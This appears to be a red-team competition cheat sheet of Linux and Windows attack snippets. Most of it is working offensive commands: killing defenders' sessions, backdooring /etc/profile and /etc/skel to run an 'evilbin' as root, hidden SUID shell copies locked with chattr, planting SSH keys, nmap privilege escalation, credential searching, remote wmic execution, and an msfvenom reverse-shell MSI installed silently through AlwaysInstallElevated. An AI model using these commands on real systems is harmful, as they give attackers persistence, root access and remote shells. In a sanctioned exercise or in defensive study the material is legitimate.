# Red Team Strategies
Collection of red team strategies and generally useful snippets to reference during events.
## Misc

### Linux tty whackamole:
Runs continuously to kill any tty sessions that are not from your specific IP

&nbsp;&nbsp;&nbsp;&nbsp;<code>for i in 'w  -h | grep -v [your ip] | awk '{print $2}'';do pkill -9 -t $i;done</code>
### Windows RDP whackamole
Runs continuously to kill any RDP sessions that are not your specific connection. 
 1. Get the ID number for your connection using  <code>qwinsta</code>:
 &nbsp;&nbsp;&nbsp;&nbsp; <code> qwinsta </code>
 2. Use <code> rwinsta </code> to kill RDP sessions with different ID numbers
 
 &nbsp;&nbsp;&nbsp;&nbsp;<code>for /l %i in (1,0,2) do @ping -n 20 127.0.0.1 1>&2>nul & @rwinsta 3</code>
 
 &nbsp;&nbsp;&nbsp;&nbsp;*You can adjust the timing by pinging less or more* (<code>ping -n [number]</code>*where a smaller number will run more frequently. 
 
 &nbsp;&nbsp;&nbsp;&nbsp;Target additional RDP sessions by changing the id number supplied to* <code>rwinsta</code>

### Windows prevent specific app from staying open

&nbsp;&nbsp;&nbsp;&nbsp;<code>for /l %i in (1,0,2) do @ping -n 1 127.0.0.1 > nul && taskkill /IM calc.exe</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>for /l %i in (1,0,2) do @ taskkill /IM calc.exe</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>for /l %i in (1,0,2) do @wmic process where "name like '%calc.exe%'" call terminate</code>

### Chattr attrib
chattr on linux prevents a file from being modified by users until the chattr flag is removed, which requires root. It adds an additional hurdle for teams trying to modify specific files. Can be applied to files or directories.

&nbsp;&nbsp;&nbsp;&nbsp;<code>chattr +i [file/dir]</code> *adds chattr flag*

&nbsp;&nbsp;&nbsp;&nbsp;<code>chattr -i [file/dir]</code> *removes chattr flag*

### noclobber
The "no clobber" environment variable helps prevent the use of ">" for redirection of when writing to a file. It adds an additional hurdle to teams trying to modify specific files. It is tied to a user's shell session, so to make it more long lasting, add it to the bashrc file of any user. While set, you can still redirect to files using >| instead. 

For blue team, this could be an interesting tactic. Set the option on all blue team accounts so that if one is compromised and used by attacking team, the attacking team might be confused when trying to write with ">" if they are not familiar with noclobber.

&nbsp;&nbsp;&nbsp;&nbsp;<code>set -o noclobber</code> *prevents use of > to overwrite or append to files*

&nbsp;&nbsp;&nbsp;&nbsp;<code>set +o noclobber</code> *allows use of > to overwrite or append to files*

 ### Writing files
 There are many executables that can write files that may avoid some of the standard monitoring a defending team may put in place. Check out the following resources that list typical OS native commands for living off the land that support file writing:
 
https://gtfobins.github.io/#+file%20write

https://lolbas-project.github.io/


### Linux command alias 
Use alias names to trick teams into running commands on your behalf. Good for persistence. It does have some limitations with passing arguments. To handle that, check out linux functions.


&nbsp;&nbsp;&nbsp;&nbsp;<code>alias ww=”cd /var/www/html”</code> *creates an alias of ww that will change directories to /var/www/html *

&nbsp;&nbsp;&nbsp;&nbsp;<code>alias cd=”/tmp/evil_bin_file & cd”</code> *creates an alias of cd that will launch an evil bin file and then run cd *

### Linux Functions
todo

### Restricted shells
Set users to use restricted shells which limits the commands they are able to run. Edit /etc/passwd and change any user's default shell to an rshell that's on the system.

&nbsp;&nbsp;&nbsp;&nbsp;<code>root:x:0:0:root:/root:/usr/bin/rbash</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>root:x:0:0:root:/root:/usr/bin/rzsh</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>root:x:0:0:root:/root:/usr/bin/rsh</code>

### Using the wall command
The wall command in linux echos output to all existing shell sessions for any user that is logged in. You can chat this way or you can troll by sending other things like a non-ending feed stream of random characters.

&nbsp;&nbsp;&nbsp;&nbsp;<code>cat /dev/urandom | wall</code>

### Determine who is logged on to what machine (windows)
If rpc ports are open and you have a valid admin level account on the windows system or domain you can query who is logged in where with wmic commands
&nbsp;&nbsp;&nbsp;&nbsp;<code>wmic /node:x.x.x.%i /user:administrator /password:adminpassword computersystem get username</code>

Ping sweep a range and then run the command: 
&nbsp;&nbsp;&nbsp;&nbsp;<code>for /L %i in (1,1,254) do @echo %i && @ping –n 1 x.x.x.%i | find /I “reply” && @wmic /node:x.x.x.%i /user:administrator /password:adminpassword computersystem get username</code>

*Note: If the password switch fails, omit it, and type in the pw interactively.*

### Remotely terminate processes (windows)
If rpc ports are open and you have a valid admin level account on the windows system or domain you can remotely run commands, like terminated processes

&nbsp;&nbsp;&nbsp;&nbsp;<code>wmic /node:x.x.x.%i /user:administrator /password:adminpassword process where "name like '%calc.exe%'" call terminate</code>

*Note: If the password switch fails, omit it, and type in the pw interactively.*

### Remotely create processes (windows)
If rpc ports are open and you have a valid admin level account on the windows system or domain you can remotely run commands, non-interactive processes (no gui)

&nbsp;&nbsp;&nbsp;&nbsp;<code>wmic /node:x.x.x.%i /user:administrator /password:adminpassword process call create \\path\to\app</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>wmic /node:x.x.x.%i /user:administrator /password:adminpassword process call create 'cmd.exe /c [command]' </code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>wmic /node:x.x.x.%i /user:administrator /password:adminpassword process call create 'cmd.exe /c [command] >> \\your\writeable\share\restults.txt' </code>*to view results from your command (if needed) you need to send the results to a share*

*Note: If the password switch fails, omit it, and type in the pw interactively.*

### Compromising the linux user creation process
You can modify a few files and directories to get code execution anytime a new user is created - remember root or a super user is needed to create an account so whatever you add gets executed as root or a super user. You can also modify the account profiles, including bashrc if you want to set new aliases or functions for example. 

Adding a malicious bin (callback would be good) file to be called during the user creation process:

 1. Copy your bin file to the system somewhere in the normal path locations like /usr/bin
 2. <code>echo "usr/bin/evilbin" &" >> /etc/profile</code> *adds line in profile script to run our evil bin*
 3. <code>echo "usr/bin/evilbin" &" >> /etc/skel/.profile</code> *adds line in skel outline .profile script to run our evil bin. /etc/skel is what is copied to all new users' home directories upon creation*
 4. <code> chmod u+s /usr/bin/evilbin & chmod u+x /usr/bin/evilbin</code>*sets suid and execute permissions on the evilbin*
 5. <code> chattr +i /etc/skel/.profile /etc/profile /usr/bin/evilbin</code>

### Enum for setuid binaries on linux
&nbsp;&nbsp;&nbsp;&nbsp;<code>find / -perm -4000 -type f 2>/dev/null</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>find / perm -u=s -type f 2>/dev/null</code>

### Add private key to authorized keys file
Create a team ssh key and drop it into any authorzied_keys files you can in user directories under .ssh

### Privesc for nmap if allowed by sudo
&nbsp;&nbsp;&nbsp;&nbsp;<code>echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse</code>

### Copy existing shells with suid and hide them for persistence 

 1. <code>cp /bin/bash /.svc</code>
 2. <code>chmod u+s /.svc & chmod u+x /.svc</code>
 3.  <code>touch -d "5 January 2021" /.svc</code>
 4.  <code>chattr +i /.svc</code>

###CMDKey stores creds on windows systems
You can cache creds through runas on windows systems which will allow anyone to runas a given user with those cached creds. Check for the following:

&nbsp;&nbsp;&nbsp;&nbsp;<code>cmdkey /list</code>
&nbsp;&nbsp;&nbsp;&nbsp;<code>runas /savecred /user:admin C:\PrivEsc\reverse.exe</code>*if you find the admin account for example, run it like this*

### Windows post compromise manual enum


&nbsp;&nbsp;&nbsp;&nbsp;<code>dir /s *pass* == *.config</code> *searches for 'pass' in all config files*

&nbsp;&nbsp;&nbsp;&nbsp;<code>findstr /si password *.xml *.ini *.txt</code> *searches for 'password' in multiple files*

&nbsp;&nbsp;&nbsp;&nbsp;<code>Findstr /simp string \\share\location\*.config</code> *searches for a string in all .config files in all directories*

&nbsp;&nbsp;&nbsp;&nbsp;<code>dir /s *pass* == *cred* == *vnc* == *.config*</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>findstr /si password *.xml *.ini *.txt</code>

### Other useful windows files to check

&nbsp;&nbsp;&nbsp;&nbsp;<code>c:\sysprep.inf</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>c:\sysprep\sysprep.xml</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>%WINDIR%\Panther\Unattend\Unattended.xml</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>%WINDIR%\Panther\Unattended.xml</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>sysvol policy files containing cPassword on a domain controller</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>%SYSTEMROOT%\SYSVOL\sysvol</code>
 
&nbsp;&nbsp;&nbsp;&nbsp;<code>Services\Services.xml: Element-Specific Attributes</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>Printers\Printers.xml: SharedPrinter Element</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>Drives\Drives.xml: Element-Specific Attributes</code>
 
&nbsp;&nbsp;&nbsp;&nbsp;<code>DataSources\DataSources.xml: Element-Specific Attributes</code>
 
### Elevated software install
 
If the following registry keys contain "AlwaysInstallElevated" value 0x1, then any MSI run will run as admin. For exmaple: 

&nbsp;&nbsp;&nbsp;&nbsp;<code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code> or

&nbsp;&nbsp;&nbsp;&nbsp;<code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code>

then create an install package:

&nbsp;&nbsp;&nbsp;&nbsp;<code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=Your_IP LPORT=Your_port -f msi -o shell.msi</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>msiexec /quiet /qn /i C:\Temp\shell.msi</code>
